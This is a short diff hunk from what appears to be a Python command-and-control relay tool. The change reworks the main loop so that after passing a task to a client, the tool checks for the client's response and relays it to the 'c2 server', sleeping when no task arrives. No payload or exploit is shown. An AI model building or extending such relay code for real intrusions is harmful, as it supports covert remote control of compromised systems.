@@ -398,17 +398,17 @@ def main():
 				if args.debug:
 					print commonUtils.color("Encoding and relaying task to client", status=False, yellow=True)
 				establishedSession.relayTask(newTask)
+				# Attempt to retrieve a response from the client
+				# TODO: Probably need logic to handle large/chunked responses
+				if args.verbose:
+					print commonUtils.color("Checking the client for a response...")
+				b_response = establishedSession.checkForResponse()
+
+				# Let's relay this response to the c2 server
+				establishedSession.relayResponse(sock, b_response)
 			else:
-				break #DEBUG, not sure if this is right? If we don't recieve a task, we shouldn't be expecting a response?
+				sleep(1.5)
 
-			# Attempt to retrieve a response from the client
-			# TODO: Probably need logic to handle large/chunked responses
-			if args.verbose:
-				print commonUtils.color("Checking the client for a response...")
-			b_response = establishedSession.checkForResponse()
-
-			# Let's relay this response to the c2 server
-			establishedSession.relayResponse(sock, b_response)
 
 			# Restart this loop
 	except KeyboardInterrupt:
